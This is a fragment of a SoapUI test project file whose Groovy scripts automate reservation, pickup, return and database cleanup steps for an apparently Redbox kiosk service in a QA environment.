log.info ("ProcessorTranID:$ProcessorTranID;ApprovalCode:$ApprovalCode;KioskID:$KioskID;ProcessorDeclinedCode:$ProcessorDeclinedCode;AVSResponseCode:$AVSResponseCode;SalesTaxRate:$SalesTaxRate;AuthAmount:$AuthAmount;CustomerID:$CustomerID;InvoiceID:$InvoiceID;LastDateTime:$LastDateTime;WebAccountID:$WebAccountID")

//Build sql Query to insert into reservation table.
sqlQuery = ""
sqlQuery += "INSERT INTO [dbo].[Reservation]"
sqlQuery += "\n"
sqlQuery += "([CardID]"
sqlQuery += "\n"
sqlQuery += ",[KioskID]"
sqlQuery += "\n"
sqlQuery += ",[BarCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorTranID]"
sqlQuery += "\n"
sqlQuery += ",[ReferenceNumber]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorLogID]"
sqlQuery += "\n"
sqlQuery += ",[ApprovalCode]"
sqlQuery += "\n"
sqlQuery += ",[ProcessorDeclinedCode]"
sqlQuery += "\n"
sqlQuery += ",[AVSResponseCode]"
sqlQuery += "\n"
sqlQuery += ",[Email_Address]"
sqlQuery += "\n"
sqlQuery += ",[DateCreated]"
sqlQuery += "\n"
sqlQuery += ",[StatusCode]"
sqlQuery += "\n"
sqlQuery += ",[FailureCode]"
sqlQuery += "\n"
sqlQuery += ",[RentedDate]"
sqlQuery += "\n"
sqlQuery += ",[SalesTaxRate]"
sqlQuery += "\n"
sqlQuery += ",[AuthAmount]"
sqlQuery += "\n"
sqlQuery += ",[LastUpdate]"
sqlQuery += "\n"
sqlQuery += ",[CustomerID]"
sqlQuery += "\n"
sqlQuery += ",[InvoiceID]"
sqlQuery += "\n"
sqlQuery += ",[Mobile]"
sqlQuery += "\n"
sqlQuery += ",[UserAgent]"
sqlQuery += "\n"
sqlQuery += ",[WebAccountID]"
sqlQuery += "\n"
sqlQuery += ",[ClientIP]"
sqlQuery += "\n"
sqlQuery += ",[OmnitureSuiteId]"
sqlQuery += "\n"
sqlQuery += ",[RedboxDeviceIdentifier])"
sqlQuery += "\n"
sqlQuery += "VALUES"
sqlQuery += "\n"
sqlQuery += "(NULL"
sqlQuery += "\n"
sqlQuery += ",\'$KioskID\'"
sqlQuery += "\n"
sqlQuery += ",\'$BarcodeForTnx\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorTranID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ReferenceNumber\'"
sqlQuery += "\n"
sqlQuery += ",\'$TransactionID\'"
sqlQuery += "\n"
sqlQuery += ",\'$ApprovalCode\'"
sqlQuery += "\n"
sqlQuery += ",\'$ProcessorDeclinedCode\'"
sqlQuery += "\n"
sqlQuery += ",\'I4\'"
sqlQuery += "\n"
sqlQuery += ",\'$Email\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",1"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'$RentDate\'"
sqlQuery += "\n"
sqlQuery += ",\'$SalesTaxRate\'"
sqlQuery += "\n"
sqlQuery += ",\'$AuthAmount\'"
sqlQuery += "\n"
sqlQuery += ",\'$LastDateTime\'"
sqlQuery += "\n"
sqlQuery += ",\'$CustomerID\'"
sqlQuery += "\n"
sqlQuery += ",\'$InvoiceID\'"
sqlQuery += "\n"
sqlQuery += ",0"
sqlQuery += "\n"
sqlQuery += ",\'SoapUI-Automation\'"
sqlQuery += "\n"
sqlQuery += ",\'$WebAccountID\'"
sqlQuery += "\n"
sqlQuery += ",\'10.30.7.238\'"
sqlQuery += "\n"
sqlQuery += ",3"
sqlQuery += "\n"
sqlQuery += ",NULL"
sqlQuery += "\n"
sqlQuery += ")"

def insertReservation = rbsql.execute(sqlQuery);

def updateTransaction = rbsql.execute("Update [Transaction] Set RentalType = 3 Where Transaction_ID = $TransactionID");</script></con:config></con:testStep><con:testStep type="groovy" name="PickupValidation" id="af92b283-88ad-4501-bf0b-0aea1abe7442"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["PickupValidation"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));
def CustomerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' )
def AccountNumber = context.expand( '${#TestCase#AccountNumber}' )

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("CustomerProfileNumber", CustomerProfileNumber);
tc.setPropertyValue("AccountNumber", AccountNumber);
tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [PickupValidation] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
	testRunner.testCase.setPropertyValue("TestCaseStatus","PickupValidation $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","PickupValidation $tcStatus");
}</script></con:config></con:testStep><con:testStep type="groovy" name="Pickup" id="7ebedb0b-e3e8-460e-8c5f-5376379bbbd4"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status

def isOffline = context.expand( '${DataSource#IsOffline}' );
//Set properties from Data Source
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Pickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
tc.setPropertyValue("Email", context.expand( '${DataSource#Email}' ));
tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
tc.setPropertyValue("UseCredits", '0');
tc.setPropertyValue("RentalTaxRate", context.expand( '${#TestCase#RentalTaxRate}' ));
tc.setPropertyValue("PurchaseTaxRate", context.expand( '${#TestCase#PurchaseTaxRate}' ));
tc.setPropertyValue("DigitalPurchaseTaxRate", context.expand( '${#TestCase#DigitalPurchaseTaxRate}' ));
tc.setPropertyValue("RentalVendStatus", context.expand( '${DataSource#RentalVendStatus}' ));
tc.setPropertyValue("PurchaseVendStatus", context.expand( '${DataSource#PurchaseVendStatus}' ));
tc.setPropertyValue("IsOffline", "false");//hardCoded
tc.setPropertyValue("ReferenceNumber", context.expand( '${#TestCase#ReferenceNumber}' ));

//Get properties from Authorize test case from test suite Generic Steps (KioskService).
def authtc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Authorize"];
tc.setPropertyValue("PurchaseCount", authtc.getPropertyValue("PurchaseCount"));
tc.setPropertyValue("PurchaseBarcodes", authtc.getPropertyValue("PurchaseBarcodes"));
tc.setPropertyValue("PurchaseTitleIds", authtc.getPropertyValue("PurchaseTitleIds"));
tc.setPropertyValue("PurchaseProductFamily", authtc.getPropertyValue("PurchaseProductFamily"));
tc.setPropertyValue("PurchaseProductType", authtc.getPropertyValue("PurchaseProductType"));
tc.setPropertyValue("PurchaseDiscPrice", authtc.getPropertyValue("PurchaseDiscPrice"));
tc.setPropertyValue("RentalCount", authtc.getPropertyValue("RentalCount"));
tc.setPropertyValue("RentalBarcodes", authtc.getPropertyValue("RentalBarcodes"));
tc.setPropertyValue("RentalTitleIds", authtc.getPropertyValue("RentalTitleIds"));
tc.setPropertyValue("RentalProductFamily", authtc.getPropertyValue("RentalProductFamily"));
tc.setPropertyValue("RentalProductType", authtc.getPropertyValue("RentalProductType"));
tc.setPropertyValue("RentalDiscPrice", authtc.getPropertyValue("RentalDiscPrice"));
tc.setPropertyValue("RentalNonReturnPrice", authtc.getPropertyValue("RentalNonReturnPrice"));
tc.setPropertyValue("RentalNonReturnDays", authtc.getPropertyValue("RentalNonReturnDays"));
tc.setPropertyValue("HasPhysicalPurchase", authtc.getPropertyValue("HasPhysicalPurchase"));
tc.setPropertyValue("DiscountPayload", authtc.getPropertyValue("DiscountPayload"));
tc.setPropertyValue("CCPayload", authtc.getPropertyValue("CCPayload"));
tc.setPropertyValue("PromoCode", authtc.getPropertyValue("PromoCode"));
tc.setPropertyValue("PromoValue", authtc.getPropertyValue("PromoValue"));
tc.setPropertyValue("CustomerProfileNumber", authtc.getPropertyValue("CustomerProfileNumber"));
tc.setPropertyValue("EstimatedLoyaltyAmount", authtc.getPropertyValue("EstimatedLoyaltyAmount"));
tc.setPropertyValue("HasLoyaltyDiscount", authtc.getPropertyValue("HasLoyaltyDiscount"));
tc.setPropertyValue("HasPromoDiscount", authtc.getPropertyValue("HasPromoDiscount"));
tc.setPropertyValue("EnableServiceFee", authtc.getPropertyValue("EnableServiceFee"));
tc.setPropertyValue("HasUpsell",authtc.getPropertyValue("HasUpsell"));
tc.setPropertyValue("ServiceFeePayload", authtc.getPropertyValue("ServiceFeePayload"));
tc.setPropertyValue("CardType", authtc.getPropertyValue("CCType"));

tc.setPropertyValue("TransactionID", authtc.getPropertyValue("TransactionID"));
tc.setPropertyValue("InvoiceID", authtc.getPropertyValue("InvoiceID"));
//MDV
tc.setPropertyValue("RentalMDVFlag", authtc.getPropertyValue("RentalMDVFlag"));
tc.setPropertyValue("RentalMDVDiscNumber", authtc.getPropertyValue("RentalMDVDiscNumber"));
tc.setPropertyValue("PurchaseMDVFlag", authtc.getPropertyValue("PurchaseMDVFlag"));
tc.setPropertyValue("PurchaseMDVDiscNumber", authtc.getPropertyValue("PurchaseMDVDiscNumber"));

def runner = tc.run( null, false );
// show that it worked out ok
log.info("Status: $runner.status, time taken for TestCase [Pickup] was: $runner.timeTaken ms");
def tcStatus = (runner.status).toString()
if(tcStatus == "FAIL")
{
	assert runner.status == Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
	testRunner.testCase.setPropertyValue("TestCaseStatus","Pickup $tcStatus");
	testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}
else
{
	// assert that it didn't fail
	assert runner.status != Status.FAILED : runner.reason
	testRunner.testCase.setPropertyValue("TestCaseStatus","Pickup $tcStatus");
	testRunner.testCase.setPropertyValue("TransactionID", tc.getPropertyValue("TransactionID"));
	testRunner.testCase.setPropertyValue("InvoiceID", tc.getPropertyValue("InvoiceID"));
}</script></con:config></con:testStep><con:testStep type="groovy" name="Return" id="7bcd6ff5-b612-45ed-8be6-2b881affc14f"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
//get the Return Test case
def tc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Return"];
def reconciletc = testRunner.testCase.testSuite.project.testSuites["Generic Steps (KioskService)"].testCases["Pickup"];
//Cleaning up the properties; set the values to NULL before the start
for(int j=0;j&lt;tc.getPropertyCount();j++)
{
   tc.getPropertyAt(j).setValue("");
}
def vendedBarcodes = reconciletc.getPropertyValue("VendedRentalBarcodes");
def TransactionID = reconciletc.getPropertyValue("TransactionID");
def CardType = reconciletc.getPropertyValue("CardType");
def InvoiceID = reconciletc.getPropertyValue("InvoiceID");
def IsOffline = reconciletc.getPropertyValue("IsOffline");
def RentalCount = reconciletc.getPropertyValue("VendedRentalsCount");
def PurchaseCount = reconciletc.getPropertyValue("VendedPurchaseCount");
def setDaysBack = Eval.me("[" + context.expand('${DataSource#SetDaysBack}') + "]");
def customerProfileNumber = context.expand( '${#TestCase#CustomerProfileNumber}' );
log.info ("setDaysBack:$setDaysBack; vendedBarcodes:$vendedBarcodes");
vendedBarcodesList = vendedBarcodes.split(",");
//Added this logic to avoid bad data in datasource; test case failure due to bad data
if (vendedBarcodesList.size() != setDaysBack.size())
{
	def difference = (vendedBarcodesList.size() - setDaysBack.size())
     for (i = 0; i &lt; difference; i++)
     {
     	setDaysBack.add('0') //if the size is different add the default to 0
     }
}
else
{
     //nothing to do, code/data looks good
}
def setDaysBackList = setDaysBack.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
//Get Scenario Count
testRunner.testCase.setPropertyValue("ScenarioCount", (testRunner.testCase.getPropertyValue("ScenarioCount").toShort() + 1 ).toString());
testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].setPropertyValue("TotalScenarioCount", (testRunner.testCase.testSuite.project.testSuites[testRunner.testCase.testSuite.name].getPropertyValue("TotalScenarioCount").toShort() + 1 ).toString())
//Call Return Step in for loop based on number of barcodes.
if (vendedBarcodes == "")
{
	log.info ("No Return is required");
	testRunner.gotoStepByName("DataSource Loop");
}
else
{
	for (r = 0; r &lt; vendedBarcodesList.size(); r++)
	{				
		curvendedBarcodes = vendedBarcodesList[r].toString().trim();
		cursetDaysBack = setDaysBackList[r].toString().trim()
		log.info ("SetDaysBack:$cursetDaysBack ;Barcode:$curvendedBarcodes");
		tc.setPropertyValue("Barcode", curvendedBarcodes);
		tc.setPropertyValue("SetDaysBack", cursetDaysBack);
		tc.setPropertyValue("KioskID", context.expand( '${DataSource#KioskID}' ));
		tc.setPropertyValue("TransactionID", TransactionID);
		tc.setPropertyValue("ReturnType", '6' );
		tc.setPropertyValue("FailedSecurityRead", 'False' );
		tc.setPropertyValue("CustomerProfileNumber", customerProfileNumber );
		tc.setPropertyValue("CardType", CardType);
		tc.setPropertyValue("InvoiceID", InvoiceID);
		tc.setPropertyValue("IsOffline", IsOffline);
		tc.setPropertyValue("RentalCount", RentalCount);
		tc.setPropertyValue("PurchaseCount", PurchaseCount);
	
		def runner = tc.run( null, false );
		// show that it worked out ok
		log.info("Status: $runner.status, time taken for TestCase [Return] was: $runner.timeTaken ms");
		def tcStatus = (runner.status).toString()
			if(tcStatus == "FAIL")
		{
			assert runner.status == Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("FailCount",(testRunner.testCase.getPropertyValue("FailCount").toShort() + 1 ).toString());
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("SaveResults"); //No need to run the next steps.
		}
		else
		{
			// assert that it didn't fail
			assert runner.status != Status.FAILED : runner.reason
			testRunner.testCase.setPropertyValue("SuccessCount",(testRunner.testCase.getPropertyValue("SuccessCount").toShort() + 1 ).toString());
			testRunner.testCase.setPropertyValue("TestCaseStatus","Return $tcStatus");
			testRunner.gotoStepByName("DataSource Loop");
		}
	
	}
}</script></con:config></con:testStep><con:testStep type="datasink" name="SaveResults" id="ce2297af-7030-45f8-9989-8b56d5ee6fc3"><con:settings/><con:config xsi:type="con:DataSinkStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSink type="File"><con:configuration><fileName>${projectDir}/Test_Results.txt</fileName><separator>:</separator><escape>"</escape><quote>false</quote><trim>true</trim><append>false</append><encoding>Cp1252</encoding></con:configuration></con:dataSink><con:properties><con:property><con:name>Number</con:name><con:value>${#TestCase#ScenarioNo}</con:value></con:property><con:property><con:name>Scenario</con:name><con:value>${DataSource#Scenario}</con:value></con:property><con:property><con:name>TransactionId</con:name><con:value>${#TestCase#TransactionId}</con:value></con:property><con:property><con:name>Status</con:name><con:value>${#TestCase#TestCaseStatus}</con:value></con:property><con:property><con:name>Date</con:name><con:value>${=new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date())}</con:value></con:property><con:property><con:name>TestCaseName</con:name><con:value>TestCase=${context.testCase.name}</con:value></con:property></con:properties></con:config></con:testStep><con:testStep type="datasourceloop" name="DataSource Loop" id="9c67f32a-3b54-4c4e-9fa2-9616977df877"><con:settings/><con:config><dataSourceStep>DataSource</dataSourceStep><targetStep>Get Data</targetStep></con:config></con:testStep><con:setupScript>testRunner.testCase.setPropertyValue("StartTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));
log.info("/###########################START###########################/");
log.info("Test Case Name : " + context.testCase.name);
log.info("/###########################START###########################/");
//Reset properties
testRunner.testCase.setPropertyValue("SuccessCount","0");
testRunner.testCase.setPropertyValue("FailCount","0");
testRunner.testCase.setPropertyValue("TotalScenarioCount","0");

//Cleanup Script
log.info("Cleaning up any open transactions from previous executions...");
import com.eviware.soapui.model.testsuite.TestRunner.Status
import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def rbConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def rbconstring = rbConObj.getConnectionString();
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(rbconstring);
def mssql = Sql.newInstance(msconstring);

//Disable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 0");
log.info ("Batch Job is disabled");

log.info("...cleaning up transactions");
sql.eachRow("SELECT t.transaction_id FROM [Transaction] t INNER JOIN disc_transaction dt ON t.transaction_id = dt.transaction_id WHERE t.customer_id in (19799,264389) AND dt.Transaction_Type = 1  AND t.Transaction_Status = 4 AND ((dt.DiscTransaction_Status = 2) OR ( dt.DiscTransaction_Status = 4 AND t.ChargeDate IS NOT NULL AND (ApprovalCode IS NULL OR ApprovalCode = '')))"){
//for each transaction id remove disc transaction, transaction and customer disc etc
	row ->
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM TransactionDiscount WHERE TransactionId = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM disc_transaction WHERE transaction_id = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM unplayablereturnhistory WHERE transactionid = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM [TRANSACTION] WHERE TRANSACTION_ID = ${row.Transaction_Id}"))
	log.info("Number of rows deleted: " +sql.executeUpdate("DELETE FROM CustomerTransaction WHERE TransactionID = ${row.Transaction_Id}"))
}


log.info("...cleaning up barcodes");
//reset the disc statuses to 'in kiosk'
log.info("Number of customer disc deleted: " + sql.executeUpdate("DELETE FROM CustomerDisc WHERE CustomerId in (19799,264389)"))
//sql.executeUpdate("UPDATE disc SET physical_status = 2 Where Title_ID in (Select Title_ID from Title WHere [FormatId] = 17) and KioskClient_ID = 1505")
sql.executeUpdate("UPDATE disc SET physical_status = 2 Where KioskClient_ID = 1505");

testRunner.testCase.setPropertyValue("ScenarioCount", "0");</con:setupScript><con:tearDownScript>import groovy.json.JsonSlurper
import groovy.sql.Sql
com.eviware.soapui.support.GroovyUtils.registerJdbcDriver("com.microsoft.sqlserver.jdbc.SQLServerDriver");
def msConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def msconstring = msConObj.getConnectionString();
//Define the Connection
def mssql = Sql.newInstance(msconstring);
//Enable batching job.
mssql.execute("EXEC msdb.dbo.sp_update_job @job_name='CreateBatchItemsAndBatches',@enabled = 1");
log.info ("Batch Job is Enabled");

def scenarioCount = context.expand( '${#TestCase#ScenarioCount}' )

log.info("/###########################END###########################/");
log.info("Test Case Name : " + context.testCase.name + "Test Case Status : " + testRunner.getStatus());
log.info("Scenario Count : $scenarioCount");
log.info ("Time Taken: ${((testRunner.timeTaken)/1000)/60} mins");
log.info("/###########################END###########################/");
testRunner.testCase.setPropertyValue("EndTime", new java.text.SimpleDateFormat("MM/dd/yy-HH:mm:ss.SSS").format(new java.util.Date()));</con:tearDownScript><con:properties><con:property><con:name>TransactionID</con:name><con:value>1982975</con:value></con:property><con:property><con:name>InvoiceID</con:name><con:value>2149058086</con:value></con:property><con:property><con:name>CustomerProfileNumber</con:name><con:value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">90284864596698</con:value></con:property><con:property><con:name>RentalTaxRate</con:name><con:value>9.7500</con:value></con:property><con:property><con:name>PurchaseTaxRate</con:name><con:value>8.0000</con:value></con:property><con:property><con:name>DigitalPurchaseTaxRate</con:name><con:value>0.0000</con:value></con:property><con:property><con:name>ServiceFeeTaxRate</con:name><con:value>9.9500</con:value></con:property><con:property><con:name>TestCaseStatus</con:name><con:value>Return PASS</con:value></con:property><con:property><con:name>ScenarioNo</con:name><con:value>71</con:value></con:property><con:property><con:name>StartTime</con:name><con:value>12/26/18-14:21:00.249</con:value></con:property><con:property><con:name>EndTime</con:name><con:value>12/26/18-14:24:05.290</con:value></con:property><con:property><con:name>ServiceFeeAmount</con:name><con:value>0.0900</con:value></con:property><con:property><con:name>ReferenceNumber</con:name><con:value>5648613</con:value></con:property><con:property><con:name>AccountNumber</con:name><con:value>81483122978646</con:value></con:property><con:property><con:name>SuccessCount</con:name><con:value>51</con:value></con:property><con:property><con:name>FailCount</con:name><con:value>0</con:value></con:property><con:property><con:name>TotalScenarioCount</con:name><con:value>0</con:value></con:property><con:property><con:name>ScenarioCount</con:name><con:value>31</con:value></con:property></con:properties><con:reportParameters/><con:breakPoints><con:testStepId>6873cb8c-7751-4904-9fc0-ed152c6ef0c6</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>d498c61d-c9fd-48e5-baf1-1503a4a1b824</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>275f8372-53c8-49f3-807b-3f64816f3d89</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>3b329060-a4aa-4532-9611-e37bcd9a11c3</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>f9658b22-7814-4f47-af67-f42efbd6c101</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>ef30018b-951d-43d4-95b1-5f1c3248c5b1</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>b3b7c784-7c50-42e4-b75d-8e6f746e026c</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>347bcb1b-704d-4b55-82ea-8c570a159ab9</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>09eaa7a0-2291-4d7a-84cd-5c6da1e51274</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints><con:breakPoints><con:testStepId>5a35d39d-4f88-4217-bf3a-f3cebdc33ac5</con:testStepId><con:status>NONE</con:status><con:properties/></con:breakPoints></con:testCase><con:testCase id="cb97fa47-4b71-4018-ad58-447f6008dcad" discardOkResults="true" failOnError="false" failTestCaseOnErrors="true" keepSession="false" name="ModResvPickup" searchProperties="true" timeout="0" wsrmEnabled="false" wsrmVersion="1.0" wsrmAckTo="" amfAuthorisation="false" amfEndpoint="" amfLogin="" amfPassword="" maxResults="0"><con:settings><con:setting id="IncludeOverview">true</con:setting><con:setting id="IncludeResults">true</con:setting><con:setting id="FlowLayout">false</con:setting><con:setting id="ErrorDetails">true</con:setting><con:setting id="IncludeCoverage">true</con:setting></con:settings><con:testStep type="jdbc" name="WarmUp Script" id="36141139-d194-487a-b460-459386ef6eac"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>Select GetDate() AS CurrentDateTime</con:query><con:properties/></con:config></con:testStep><con:testStep type="datasource" name="DataSource" id="8b8d9183-3153-428d-8ed0-fffd94677df1"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.teststeps.datasource.DataSourceContainer@prepared-properties">&lt;xml-fragment/></con:setting></con:settings><con:config xsi:type="con:DataSourceStep" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dataSource type="Data Connection"><con:configuration><Connection>QaAutomation( QAInt )</Connection><query>Select 
	KS_Pickup.ID As ID, 
	KS_Pickup.Scenario As Scenario,
	KS_Pickup.Email As Email, 
	KS_Pickup.CreditCardNumber As Ccnumber, 
	KS_Pickup.CreditCardType As CCType,
	KS_Pickup.PromoCode As PromoCode, 
	KS_Pickup.PromoValue As PromoValue, 
	KS_Pickup.KioskID As KioskID,
	KS_Pickup.RentalFormats As rentalFormats,
	KS_Pickup.NumberOfRentals As numOfRentals,
	KS_Pickup.RentalVendStatus As RentalVendStatus,
	KS_Pickup.PurchaseFormats As PurchaseFormats,
	KS_Pickup.NumberOfPurchases As numOfPurchases,
	KS_Pickup.PurchaseVendStatus As PurchaseVendStatus,
	KS_Pickup.SetDaysBack As SetDaysBack, 
	KS_Pickup.LoyaltyFlag As LoyaltyFlag, 
	KS_Pickup.MDVFlag As MDVFlag, 
	KS_Pickup.MDVDiscNumber As MDVDiscNumber, 
	KS_Pickup.TestCaseName As TestCaseName
From KS_Pickup
Where TestCaseName is NULL </query><fetchSize/><stored-procedure>false</stored-procedure></con:configuration></con:dataSource><con:property>ID</con:property><con:property>Scenario</con:property><con:property>Email</con:property><con:property>Ccnumber</con:property><con:property>CCType</con:property><con:property>PromoCode</con:property><con:property>PromoValue</con:property><con:property>KioskID</con:property><con:property>rentalFormats</con:property><con:property>numOfRentals</con:property><con:property>RentalVendStatus</con:property><con:property>PurchaseFormats</con:property><con:property>numOfPurchases</con:property><con:property>PurchaseVendStatus</con:property><con:property>SetDaysBack</con:property><con:property>LoyaltyFlag</con:property><con:property>MDVFlag</con:property><con:property>MDVDiscNumber</con:property><con:property>TestCaseName</con:property><con:completeLastOperation>true</con:completeLastOperation><con:restartOnRun>true</con:restartOnRun></con:config></con:testStep><con:testStep type="groovy" name="Get Data" id="149dad87-5cd5-4040-b91e-18f3429a2405"><con:settings/><con:config><script>import com.eviware.soapui.model.testsuite.TestRunner.Status
def ScenarioNo =  context.expand( '${DataSource#ID}' );
testRunner.testCase.setPropertyValue("ScenarioNo", ScenarioNo.toString())
log.info ("-------------------------" + context.testCase.name + "-----------------------------");
log.info ("Scenario [$ScenarioNo]:" + context.expand( '${DataSource#Scenario}' ));
log.info ("------------------------------START----------------------------------");

//Get Data from Data Source
def ccNumber = context.expand( '${DataSource#Ccnumber}' );
def kioskID = context.expand( '${DataSource#KioskID}' );
def UseCredits = '0'; //Default to ); since credits will be disabled after Loyality is ON
def IsOffline = context.expand( '${DataSource#IsOffline}' );

//Get Encrypted CC Info using Merchant Service method.
def encryptCC = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Generate Encrypted CCInfo"];
encryptCC.setPropertyValue("CardNumber", ccNumber);
encryptCC.setPropertyValue("KeyID", context.expand( '${#Project#KeyId}' ));

def ccrunner = encryptCC.run( null, false );	
// show that it worked out ok
log.info("Status: $ccrunner.status, time taken for TestCase was: $ccrunner.timeTaken ms");
// assert that it didn't fail
assert ccrunner.status != Status.FAILED : ccrunner.reason

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('RedboxServerDB');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

//Get TaxRate for the Kiosk.
def taxDetails = sql.firstRow("Select Sales_Tax_Rate, PurchaseTaxRate, DigitalPurchaseTaxRate, ServiceFeeTaxRate,ServiceFee  from KioskClient Where KioskClient_Id = $kioskID");
def rentalTaxRate = (taxDetails.Sales_Tax_Rate);
def purchaseTaxRate = (taxDetails.PurchaseTaxRate);
def digitalPurchaseTaxRate = (taxDetails.DigitalPurchaseTaxRate);
def serviceFeeTaxRate = (taxDetails.ServiceFeeTaxRate)!= null ? (taxDetails.ServiceFeeTaxRate) : "0.0000";
def serviceFeeAmount = (taxDetails.ServiceFee)!= null ? (taxDetails.ServiceFee) : "0.0000";

log.info ("KioskID:$kioskID; RentalTaxRate:$rentalTaxRate; PurchaseTaxRate:$purchaseTaxRate; DigitalPurchaseTaxRate:$digitalPurchaseTaxRate; ServiceFeeTaxRate:$serviceFeeTaxRate");
//Save Tax Rate at property level
testRunner.testCase.setPropertyValue('RentalTaxRate',rentalTaxRate.toString());
testRunner.testCase.setPropertyValue('PurchaseTaxRate',purchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('DigitalPurchaseTaxRate',digitalPurchaseTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeTaxRate',serviceFeeTaxRate.toString());
testRunner.testCase.setPropertyValue('ServiceFeeAmount',serviceFeeAmount.toString());

def getCP = testRunner.testCase.testSuite.project.testSuites["Generic Steps (Others)"].testCases["Get Customer Info From Encrypted CC"];
